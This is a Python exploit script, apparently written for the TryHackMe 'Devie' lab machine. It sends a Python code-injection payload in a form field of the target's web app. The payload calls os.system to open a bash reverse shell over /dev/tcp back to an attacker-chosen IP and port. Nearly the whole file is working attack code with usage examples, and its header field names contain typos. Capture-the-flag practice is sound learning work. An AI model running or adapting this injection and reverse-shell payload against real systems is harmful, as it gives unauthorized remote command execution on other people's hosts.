#!/usr/bin/env python3
import requests
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="Python script for getting reverse shell on devie machine of TryHackMe"
                                     ,usage='%(prog)s -t <target machine ip> -ip machine ip -p port '
                                     ,epilog="Example --> ./devie.py -t http://10.10.166.155:5000/ -ip 10.10.13.26 -p 4444")
    parser.add_argument("-t","--target_url"
                        ,dest="url"
                        ,help="Targer url."
                        ,metavar="target_url")
    parser.add_argument("-ip"
                        ,"--local-ip"
                        ,dest="ip"
                        ,help="Enter your IP Address."
                        ,metavar="Ip address")
    parser.add_argument("-p"
                        ,"--port"
                        ,dest="port"
                        ,help="Enter the port number."
                        ,metavar="Port on which you want to connect back on")
    options = parser.parse_args()
    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    return options

class Exploit:
    def __init__(self, url, ip, port):
        self.reponse = None
        self.url = url
        self.ip = ip
        self.port = port

    def connection(self):
            try:
                self.response =  requests.get(self.url)
                if self.response:
                        print("Success!")
                else:
                        print("Target not found") 
            except:
                  print("There is something wrong with input url: ")  

    def devie_math_exploit(self):
            try:
                output=f"""__import__('os').system("bash -c 'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1'")"""
                script= output
                request_headers = {
                        "Conetent-Type":"applicationn/x-www-form-urlencoded"
                }
                data = {
                        "xa":script,
                        "xb":3
                }
                print(f"Your generated payload is -- > {output}")
                rp = requests.post(self.url,headers=request_headers,data=data)
                print("You closed the connection")
                
            except:
                print("Connected but wasn't able to get shell -- > check if you are running netcat on given port")
                
if __name__ == "__main__":
    options = get_arguments()

    url_ip = options.url
    a_ip = options.ip
    a_p = options.port
    exploit = Exploit(url_ip, a_ip, a_p)

    exploit.connection()
    exploit.devie_math_exploit()
